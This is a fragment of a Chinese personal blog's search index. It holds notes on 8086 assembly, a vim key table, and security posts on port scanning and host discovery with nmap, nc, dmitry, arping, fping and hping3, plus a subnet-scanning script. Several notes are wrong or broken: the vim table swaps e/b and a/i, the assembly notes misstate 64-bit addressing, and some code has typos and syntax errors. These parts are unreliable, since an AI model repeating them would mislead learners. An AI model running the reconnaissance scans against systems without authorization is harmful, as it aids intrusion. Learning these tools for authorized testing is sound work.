        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言入门学习</title>
      <link href="/categories/uncategorized/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
      <url>/categories/uncategorized/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="http://www.geekqanda.com/index.php/48200/现在用到汇编语言多么？学习他的意义在哪里？" target="_blank" rel="noopener"></a></p></blockquote><p>现在用到汇编语言多么？学习他的意义在哪里？**</p><p>1.汇编语言<br>        汇编语言是最接近于机器语言的编程语言。如果说机器语言是计算机操作的本质，那么汇编语言就是最最接近本质的语言。汇编语言操作直接面向硬件，所以， 我们在使用汇编语言的时候，我们能够感知计算机的运行过程和原理，从而能够对计算机硬件和应用程序之间的联系和交互形成一个清晰的认识。这也是最能够锻炼 编程者编程思维逻辑的，只有这样，学习者才能形成一个软、硬兼备的编程知识体系，这是任何高级语言都无法给予的！相对于繁复的高级语言，汇编语言指令集合 更简约，指令操作更直接，从汇编开始学习更符合循序渐进的学习原理！所以，对于计算机技术初学者或者自学者，汇编语言重要性无可替代！</p><p>2.汇编语言之于高级语言<br>　　不否认，在应用层面，高级语言占据了软件开发市场的绝大部分。也正是这种现象，误导了学习者，甚者是教育者！所以目前高校计算机专业的现状是：专业课 程中C语言，C++，java等高级语言一应俱全，而毕业的学生却连简单的程序都不能编写。为什么？听不懂，学不会！这就是缺乏基础造成的！<br>汇编语言才是计算机技术的基础，而不是常说的C语言。之所以说汇编重要，其一个重要的原因就是，汇编语言能够让你更好的理解高级语言，尤其是高级语言中的 C语言。汇编语言对于内存的操作都是基于内存地址的，而C语言中最令人头疼的指针概念，说白了就是内存的地址。指针的学习和应用中最头疼的就是在指针这个 抽象的概念和实际的内存单元之间建立思维映射，而这些恰恰是我们在汇编语言学习中频繁做的一件平常事。另外，对于C语言中的数据类型、形参实参、函数调 用、全局变量、局部变量等概念及操作，我们都可以用汇编语言中的一些操作相关联，把这些抽象的概念和过程，通过汇编语言形成一个具体的映像，深度剖析，这 样我们才能真正的学会、学好C语言。<br>　　有了汇编和C的基础，那些所谓的面向对象的语言学习起来就更为顺畅了！奉劝那些好高骛远的学习者，踏踏实实的从汇编开始吧，古云：磨刀不误砍柴工啊！ </p><p>3.汇编语言之于应用<br>　　很多学习者放弃对于汇编语言的学习，是因为高级语言的开发更容易找到工作。这个理由也是我见到过的最现实的。但是，这里面明显存在着认识误区！<br>　　首先，我们的学习是一个系统过程，我们的知识结构不是一个单一课程所能够建立的。所以，学习汇编的目的并不是非要用汇编去挣饭钱。因为汇编语言对于一个编程人员所应该具备的基本素质的培养和形成得意义是非常重大的！这在前文中已经分析了，不再赘述！<br>　　其次，汇编本身也是很重要的应用技术。由于学习者，尤其是在校的学生，平时接触的最多的是纯软件的东西，所以，觉得五花八门的软件才是计算机技术应用 的舞台。那么这些人最终会成为那位博主提到的那些工作后才意识到汇编的作用的“师兄”！汇编的操作由于跟硬件紧密相关，所以，很多硬件设施的嵌入式编程使 用的都是使用的汇编语言，因为汇编语言更直接，更有效率！我们现在的数码产品很多，而这些数码产品赖以生存的芯片，主板等，都包含了嵌入式程序，而这些程 序中，汇编语言的使用是相当重要的！</p><h2 id="汇编语言介绍"><a href="#汇编语言介绍" class="headerlink" title="汇编语言介绍"></a>汇编语言介绍</h2><p>汇编学习，重要的是思维，用会变的丝线，写C的程序</p><p>汇编语言是除了机器语言我么所能操做的最底层语言，汇编语言是效率最高的语言。高级语言优化好的话，另当别论</p><p>为什么要学汇编语言：计算机思维操作计算机</p><p>反编译原理：汇编语言与机器语言是一 一对应的</p><p>研究重点：利用硬件系统的编程结构和指令集，有效灵活的控制系统进行互作。</p><p>机器语言：机器指令的集合，机器指令展开来讲就是一台机器可以正确执行的命令</p><p>指令：（01010000）push ax</p><p>电平脉冲：0┗|｀O′|┛ 嗷~~，1凸</p><p>发展：一开始纸带打点，后来石英共振……，之后的发展是速度发生变化，但是是指仍然是01</p><p>机器码：01…</p><p>助记符：汇编相对于机器语言</p><h2 id="cpu是如何以外部交流的"><a href="#cpu是如何以外部交流的" class="headerlink" title="cpu是如何以外部交流的"></a>cpu是如何以外部交流的</h2><p>每一种CPU都有自己的汇编指令集。cpu可直接在存储器中存取，在存储器中数据和指令无区别，都是二进制信息，所以放在不同的总线上就是不同的效果。</p><p>汇编指令：机器码的助记符（核心，决定了特性）</p><p>伪指令：编译器执行</p><p>其他符号：编译器识别</p><p>优秀书籍：《编码的奥秘》</p><p>在磁盘与内存中，数据与指令都是二进制。</p><p>cpu调用内存（磁盘调到内存），项进行数据的读写，必须和外部器件（芯片）进行三类信息的交换：</p><p>存储单元的地址（地址信息）</p><p>器件的选择，读写命令（控制信息）</p><p>读写的数据(数据信息)</p><p>物理上：一根根导线的集合 </p><p>逻辑上：</p><p>地址总线——–</p><p>控制总线—————-                             -|        内存（存储芯片）    |</p><p>数据总线—————-                               -|——————–</p><p>64位的要求为，cpu,操作系统，软件 都要是64位，那么才能达到64位的处理速度。</p><p>64位就是64条地址总线，可对64个存储单元进行寻址；地址总线的宽度为64，可以寻址2^64（寻址能力）;</p><p>地址从上到下由低到高，一个地址总线可以索引一个内存单元也就是一个字节，一个字节八位。</p><p>数据总线 的宽度决定了cpu和外界的数据传送速度</p><p>8088：8</p><p>8086：16</p><p>控制总线是个总称，是一些不同控制线的集合，宽度决定了控制能力 ，一条线01（负电压）决定读写。</p><p>例如：从三号单元数据放到ax。</p><p>优秀书籍：《C的缺陷与陷阱》</p><p>存储器芯片：</p><p>读写属性分类：ram随机存储器，rom只读存储器。</p><p>从功能和连接上分类：随机存储器ram,装有BIOS的rom（各种接口卡，主板都有BIOS）,接口卡上的ram</p><p><img src="D:%5C0dong%5Cblog%5Csource%5Cimages%5C1570000896914.png" alt="1570000896914"></p><p> <img src="D:%5C0dong%5Cblog%5Csource%5Cimages%5C1570004911229.png" alt="1570004911229"></p><p>核心：以汇编语言的思维来编程，汇编编程时，从cpu的角度出发。</p><h2 id="cpu内部工作原理"><a href="#cpu内部工作原理" class="headerlink" title="cpu内部工作原理"></a>cpu内部工作原理</h2><p>一个典型的cpu 有计算器，控制器，寄存器的器件组成，这些器件是靠内部总线相连</p><p>区别：内部总线连接cpu内部器件，外部总线连接cpu 与主板上的其他器件</p><p>8086cpu有14个寄存器：AX,BX,CX,DX,SI,DI,SP,BP,IP,CS,SS,DS,ES,PSW</p><p>8086(16bit)通用寄存器ax(ah,al)向下兼容</p><p>字在寄存器中的存储，一个字2字节。</p><p>汇编指令不区分大小写</p><p>先介绍俩个指令</p><blockquote><p>mov </p><p>功能：将数据直接送入寄存器（mov ax,1000），将一个寄存器中的内容送入另一个寄存器中(mov ax,bx)</p><p>add 加</p></blockquote><h3 id="16位结构的cpu特征"><a href="#16位结构的cpu特征" class="headerlink" title="16位结构的cpu特征"></a>16位结构的cpu特征</h3><p>运算器一次最多可以处理16位的数据</p><p>寄存器的最大宽度为16位</p><p>寄存器和运算器之间的通路为16位的</p><p>8086外部有20位地址总线，可传送20位地址，寻址能力为1M; 内部为16位结构，他只能传送16位的地址，表现出的寻址能力却只有64K.</p><p> 地址加法器：物理地址=段地址*16+偏移地址</p><h3 id="段的概念"><a href="#段的概念" class="headerlink" title="段的概念"></a>段的概念</h3><p>将一组内存单元定义为段</p><p>内存并没有分段，段的划分来自于cpu（cpu将段地址和偏移地址交给地址加法器）,后在编程中根据需要，将若干的地址联系的内存单元看作一个段，用段地址*16定位段的起始地址（基础地址），用偏移地址定位段中的内存单元。</p><p>数据在21f60H内存单元，对于8086pc机上的两种描述：</p><p>数据存在内存2000:1f60单元中；常用</p><p>数据存在内存的2000段中的1f60H单元中</p><p>段地址的选出：根据需要，将地址连续，起始地址为16的倍数的一组内存单元定义为一个段。</p><h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><p>段寄存器就是提供段地址的。</p><p>8086cpu有4个段寄存器：</p><p>cs(代码段地址寄存器)</p><p>ds（数据段）</p><p>ss（堆栈段）</p><p>es（附加段）</p><h3 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h3><p>cs,ip人规定始位置</p><h3 id="cs和ip"><a href="#cs和ip" class="headerlink" title="cs和ip"></a>cs和ip</h3><p>cs和ip是8086cpu中做关键的寄存器，他们指示了cpu当前读取指令的地址。</p><p>cs为代码段寄存器</p><p>ip为指令指针寄存器</p><p><img src="D:%5C0dong%5Cblog%5Csource%5Cimages%5C1570080646781.png" alt="1570080646781"></p><p>  在任何时候，cpu将cs,ip中的内容当作段地址和偏移地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jmp ax #修改ip</span><br><span class="line"></span><br><span class="line">jmp 1000:3 #修改cs 和 ip</span><br></pre></td></tr></table></figure><p> 蓝屏一般是内存问题，卡死，死机一般是cpu问题。 </p><h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><p>只是个调试程序</p><p><img src="D:%5C0dong%5Cblog%5Csource%5Cimages%5C1570089168919.png" alt="1570089168919"></p><h2 id="寄存器内存访问"><a href="#寄存器内存访问" class="headerlink" title="寄存器内存访问"></a>寄存器内存访问</h2><h3 id="字单元"><a href="#字单元" class="headerlink" title="字单元"></a>字单元</h3><p>N和n+1号字节单元（低地址和高地址）</p><h3 id="ds"><a href="#ds" class="headerlink" title="ds"></a>ds</h3><p>8086pc中，内存地址由段地址和偏移地址组成，ds寄存器存放要访问的数据的段地址。</p><p>下列命令将10000H（1000:0）中的数据读到al中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov bx 1000</span><br><span class="line">mov bs bx</span><br><span class="line">mov al,[0]</span><br></pre></td></tr></table></figure><blockquote><p>mov al,[0]  将0这个偏移地址中的内容送入al中</p><p>增加功能：将一个内存单元中的内容送入一个寄存器。</p><p>[0]    中的0表示偏移地址，段地址在bs中（8086cpu自动获取ds中的数据为内存单元的段地址）</p><p>不能直接把1000H直接送给ds,要通过通用寄存器（硬件设计）</p></blockquote><p>将al中的数据送到10000H中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov bx 1000</span><br><span class="line">mov bs bx</span><br><span class="line">mov [0],al</span><br></pre></td></tr></table></figure><h3 id="字的传送"><a href="#字的传送" class="headerlink" title="字的传送"></a>字的传送</h3><p>8086cpu是16位的，注意区分字和字节 </p><h3 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h3><p>形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov 寄存器， 数据</span><br><span class="line">mov 寄存器， 寄存器</span><br><span class="line">mov 寄存器， 内存单元</span><br><span class="line">mov 内存单元， 寄存器</span><br><span class="line">mov 段寄存器, 寄存器</span><br><span class="line">mov 寄存器, 段寄存器</span><br></pre></td></tr></table></figure><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p>加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add 寄存器， 数据</span><br><span class="line">add 寄存器，寄存器</span><br><span class="line">add 寄存器， 内存单元</span><br><span class="line">add 内存单元， 寄存器</span><br></pre></td></tr></table></figure><h3 id="sub"><a href="#sub" class="headerlink" title="sub"></a>sub</h3><p>减</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub ax, bx  # ax&#x3D;ax-bx</span><br></pre></td></tr></table></figure><h3 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h3><p>定义一组内存单元存数据，ds</p><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p>栈是内存中的数据结构,下高地址，上高地址，方便临时存储数据而存在（内部函数）</p><p>8086以字为单位</p><blockquote><p>push ax ax中的数据送入栈</p><p>pop ax 从栈顶取出数据送入ax</p></blockquote><h3 id="ss和sp"><a href="#ss和sp" class="headerlink" title="ss和sp"></a>ss和sp</h3><p>指向栈顶元素，8086cpu只记录栈顶</p><h3 id="push"><a href="#push" class="headerlink" title="push"></a>push</h3><p>实质是内存传送指令</p><p>入栈,sp-2，放入数据</p><h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><p>出栈，拿出数据，sp+2,指向新的栈顶，但是原栈顶位置数据仍然存在；再次执行push命令后，它将被覆盖。</p><p>push和pop指令是可以在寄存器和内存之间传送数据的 </p><p>栈顶越界问题：溢出，危险</p><p>栈顶上限下限寄存器，然而8086cpu中并没有这样的寄存器</p><p>8086cpu的互作机理，只考虑当前的情况：当前栈顶在何处，当前要执行的指令是哪一条，栈空间是人自己限制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push 通用寄存器</span><br><span class="line">push 段寄存器 #将一个段寄存器中的数据入栈</span><br><span class="line">push 内存单元 #push [1]</span><br><span class="line">pop ...</span><br></pre></td></tr></table></figure><h3 id="栈段"><a href="#栈段" class="headerlink" title="栈段"></a>栈段</h3><p>ss,sp规定</p><h2 id="源程序"><a href="#源程序" class="headerlink" title="源程序"></a>源程序</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">start:程序...</span><br><span class="line">4......</span><br><span class="line">4......</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p><img src="1570204073027.png" alt="1570204073027"></p><p><img src="1570204427690.png" alt="1570204427690"></p><h3 id="cx"><a href="#cx" class="headerlink" title="cx"></a>cx</h3><p>存程序的机器码长度</p><p><img src="1570246436247.png" alt="1570246436247"></p><p>ds和cs之间有的空余  </p><p>debug程序，t一步一步执行，p来执行int 21,或者，g一步执行到底。</p><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><h3 id="bx"><a href="#bx" class="headerlink" title="bx"></a>bx</h3><p>在masm和debug中写程序是不一样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax, 1000</span><br><span class="line">mov ds, ax</span><br><span class="line">mov al, [1]</span><br></pre></td></tr></table></figure><p>在masm中就会被当作1，放入al中，debug中会把10000H处的数据放入到al中。</p><p>所以在masm编译器中，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax, 1000</span><br><span class="line">mov ds, ax</span><br><span class="line">mov bx, 1</span><br><span class="line">mov al, [bx]</span><br></pre></td></tr></table></figure><h3 id="loop"><a href="#loop" class="headerlink" title="loop"></a>loop</h3>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vim常用</title>
      <link href="/categories/%E5%B7%A5%E5%85%B7/vim%E5%B8%B8%E7%94%A8/"/>
      <url>/categories/%E5%B7%A5%E5%85%B7/vim%E5%B8%B8%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>简单介绍常用的按键</p><a id="more"></a><table><thead><tr><th>按键</th><th align="left">作用</th></tr></thead><tbody><tr><td>e</td><td align="left">字首</td></tr><tr><td>b</td><td align="left">字尾</td></tr><tr><td>a</td><td align="left">光标前insert</td></tr><tr><td>i</td><td align="left">光标后insert</td></tr><tr><td>u</td><td align="left">撤销</td></tr><tr><td>U</td><td align="left">撤销光标所在行的修改，本质是修改，可用u撤回</td></tr><tr><td>$</td><td align="left">行尾</td></tr><tr><td>0</td><td align="left">行首</td></tr><tr><td>J</td><td align="left">去除本行换行符</td></tr><tr><td>x</td><td align="left">删除</td></tr><tr><td>s</td><td align="left">删除，并进入insert状态</td></tr><tr><td>dd</td><td align="left">删除光标所在行</td></tr><tr><td>/</td><td align="left">查找</td></tr><tr><td>n</td><td align="left">向下查找</td></tr><tr><td>N</td><td align="left">向上查找</td></tr><tr><td>h</td><td align="left">左</td></tr><tr><td>j</td><td align="left">下</td></tr><tr><td>k</td><td align="left">上</td></tr><tr><td>l</td><td align="left">右</td></tr><tr><td>yy</td><td align="left">复制光标所在行</td></tr><tr><td>nyy</td><td align="left">从光标处开始复制n行</td></tr><tr><td>p</td><td align="left">在光标处粘贴行</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>端口扫描</title>
      <link href="/categories/web%E5%AE%89%E5%85%A8/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
      <url>/categories/web%E5%AE%89%E5%85%A8/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<p>端口扫描工具</p><a id="more"></a><h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>“端口”是英文port的意译，可以认为是设备与外界通讯交流的出口。端口可分为虚拟端口和物理端口，其中虚拟端口指计算机内部端口，不可见。例如计算机中的80端口、21端口、23端口等。</p><p>一台拥有IP地址的主机可以提供许多服务，比如Web服务、FTP服务、SMTP服务等，这些服务完全可以通过1个IP地址来实现。那么，主机是怎样区分不同的网络服务呢？显然不能只靠IP地址，因为IP 地址与网络服务的关系是一对多的关系。实际上是通过“IP地址+端口号”来区分不同的服务的。</p><p>因此，一个开放的端口代表一个提供的服务，不同的服务具有不同的端口号，因此要对服务进行测试，首先要确定是否开放对应端口号。</p><h2 id="端口扫描工具"><a href="#端口扫描工具" class="headerlink" title="端口扫描工具"></a>端口扫描工具</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><h3 id="dmitry"><a href="#dmitry" class="headerlink" title="dmitry"></a>dmitry</h3><p>使用dmitry进行端口扫描，其中-p参数指定dmitry进行tcp端口扫描。</p><h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><p>使用Netcat进行端口扫描。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvz IP地址  端口范围</span><br></pre></td></tr></table></figure><h2 id="端口的分类"><a href="#端口的分类" class="headerlink" title="端口的分类"></a>端口的分类</h2><p>端口范围 0-65535<br>TCP端口和UDP端口。由于TCP和UDP 两个协议是独立的，因此各自的端口号也相互独立，比如TCP有235端口，UDP也 可以有235端口，两者并不冲突。</p><ol><li>端口分为：<br>周知端口<br>周知端口是众所周知的端口号，范围从0到1023，其中80端口分配给WWW服务，21端口分配给FTP服务等。我们在IE的地址栏里输入一个网址的时候是不必指定端口号的，因为在默认情况下WWW服务的端口是“80”。</li><li>注册端口<br>端口1024到49151，分配给用户进程或应用程序。这些进程主要是用户安装的程序。</li><li>动态端口<br>动态端口的范围是从49152到65535。之所以称为动态端口，是因为它 一般不固定分配某种服务，而是动态分配。</li></ol><h2 id="端口Banner获取"><a href="#端口Banner获取" class="headerlink" title="端口Banner获取"></a>端口Banner获取</h2><p>使用<strong>Nmap</strong>扫描指定主机的端口信息，并返回Banner。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  IP地址  --script banner -p 端口号</span><br></pre></td></tr></table></figure><p>使用<strong>dmitry</strong>获取端口banner信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmitry -pb IP地址</span><br></pre></td></tr></table></figure><p>使用<strong>netcat</strong>获取Banner信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vn IP地址 端口号</span><br></pre></td></tr></table></figure><h2 id="端口服务版本信息获取"><a href="#端口服务版本信息获取" class="headerlink" title="端口服务版本信息获取"></a>端口服务版本信息获取</h2><p>利用<strong>Nmap</strong>获取目标系统的端口版本信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 端口号  -sV IP地址</span><br></pre></td></tr></table></figure><h2 id="操作系统版本信息获取"><a href="#操作系统版本信息获取" class="headerlink" title="操作系统版本信息获取"></a>操作系统版本信息获取</h2><p>使用<strong>Nmap</strong>扫描指定主机的操作系统版本信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  -O IP地址</span><br></pre></td></tr></table></figure><p>在针对内容测试时，有授权的情况下，可以利用<strong>nmap</strong>对目标进行完整测试。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -v IP地址</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>主机发现</title>
      <link href="/categories/web%E5%AE%89%E5%85%A8/%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/"/>
      <url>/categories/web%E5%AE%89%E5%85%A8/%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>主机发现所用的工具</p><p>参考：<a href="https://www.jianshu.com/p/b53d6d09246d" target="_blank" rel="noopener">https://www.jianshu.com/p/b53d6d09246d</a></p><a id="more"></a><h2 id="二层发现"><a href="#二层发现" class="headerlink" title="二层发现"></a>二层发现</h2><p>osi： 开放式系统互联，每层都是单独交互</p><p>二层发现 ：利用osi中的链路层中的协议进行主机发现。一般使用arp协议（前提是对方二层是Eternet接口）。</p><p>优点：<br>局域网中通信使用ARP协议，利用MAC地址作为对应的识别地址<br>1、速度快<br>2、可靠性高</p><p>缺点：<br>无法请求到经过路由（不同网络）的主机</p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h4 id="arping"><a href="#arping" class="headerlink" title="arping"></a>arping</h4><p>Kali linux下自带工具arping可以进行对应的二层主机发现。缺点：无法多个主机同时扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arping -c 1 ip <span class="comment">#向IP发送一个arp requeat包</span></span><br><span class="line">arping -d ip <span class="comment">#判断arp地址欺骗，-d 可显示一个ip一个或多个mac</span></span><br><span class="line">sudo arping -d  192.168.0.3 | grep <span class="string">"bytes from"</span> | awk <span class="string">'&#123;print $4,$5&#125;'</span> | cut -d <span class="string">"("</span> -f 1</span><br></pre></td></tr></table></figure><p>若扫描一个网段，脚本如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$#</span>"</span>-ne 1 ];<span class="keyword">then</span></span><br><span class="line">4<span class="built_in">echo</span><span class="string">"Usage - ./arping.sh [interface]"</span></span><br><span class="line">4<span class="built_in">echo</span><span class="string">"Example - ./arping.sh eth0"</span></span><br><span class="line">4<span class="built_in">echo</span><span class="string">"Example will perform an ARP scan of the local subnet to which eth0 is assigned"</span></span><br><span class="line">4<span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">interface=<span class="variable">$1</span></span><br><span class="line">prefix=$(ifconfig <span class="variable">$interface</span> | grep <span class="string">"inet"</span> | awk <span class="string">'&#123;print $2&#125;'</span> | cut -d <span class="string">"."</span> -f 1-3 | sed -n 1p</span><br><span class="line">)</span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> $(seq 1 254); <span class="keyword">do</span></span><br><span class="line">4arping -c 1 <span class="variable">$prefix</span>.<span class="variable">$addr</span> | grep <span class="string">"bytes from"</span> | awk <span class="string">'&#123;print $4,$5&#125;'</span> | cut -d <span class="string">":"</span> -f 1-6</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><p>-sn 不做端口扫描（arp ,dns）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn ip</span><br><span class="line">nmap -iL filename -sn</span><br></pre></td></tr></table></figure><h4 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h4><p>Kali linux 自带工具netdiscover可以针对特定子网进行多主机扫描。</p><p>主动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.127.1/24</span><br><span class="line">netdiscover -l filename</span><br></pre></td></tr></table></figure><p>被动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -p <span class="comment">#网卡混杂模式，非本网卡IP也会抓取</span></span><br></pre></td></tr></table></figure><h4 id="scapy"><a href="#scapy" class="headerlink" title="scapy"></a>scapy</h4><p>可做工具单独使用 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo scapy</span><br></pre></td></tr></table></figure><p>python库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install scapy</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="三层发现"><a href="#三层发现" class="headerlink" title="三层发现"></a>三层发现</h2><p>三层主机发现指：利用ISO中网络中的协议进行主机发现。一般使用ICMP协议</p><p>优点：<br>1、可以发现远程主机  经过路由的主机<br>2、速度相对比较快</p><p>缺点：<br>1、经常被防火墙过滤<br>2、速度相比二层发现慢</p><h3 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h3><h4 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h4><p>工具在Linux和windows都有自带，Linux下ping如果不指定-c参数，一直扫描。Windows下默认进行四次探测。</p><h4 id="fping"><a href="#fping" class="headerlink" title="fping"></a>fping</h4><p>Kali linux下自带工具fping可以进行对应的三层主机发现。可以针对多个主机同时进行主机发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fping -g 192.168.127.1&#x2F;24</span><br></pre></td></tr></table></figure><h4 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h4><p>Kali linux 自带工具hping3对目标进行三层主机发现。特点：发送自定义ICMP数据包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -c 2 --icmp 192.168.127.1</span><br></pre></td></tr></table></figure><h2 id="四层发现"><a href="#四层发现" class="headerlink" title="四层发现"></a>四层发现</h2><p>四层发现指利用OSI中的传输层协议进行主机发现，一般使用TCP、UDP探测。</p><p>优点：<br>1、可以探测远程主机<br>2、比三层发现更为可靠</p><p>缺点：<br>花费时间更长</p><h3 id="工具-2"><a href="#工具-2" class="headerlink" title="工具"></a>工具</h3><h4 id="nmap-1"><a href="#nmap-1" class="headerlink" title="nmap"></a>nmap</h4><p>Kali linux自带的Nmap可以进行二、三、四层的探测，我们接下来演示nmap探测。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap IP地址</span><br></pre></td></tr></table></figure><h4 id="hping3-1"><a href="#hping3-1" class="headerlink" title="hping3"></a>hping3</h4><p>Kali linux下自带工具hping3可以进行对应的四层层主机发现。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 --udp -c 3 IP地址</span><br></pre></td></tr></table></figure><p>并没有受到数据包，全部loss掉了。所以要结合多层主机发现来进行探测。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>xxe漏洞学习</title>
      <link href="/categories/web%E5%AE%89%E5%85%A8/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/categories/web%E5%AE%89%E5%85%A8/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
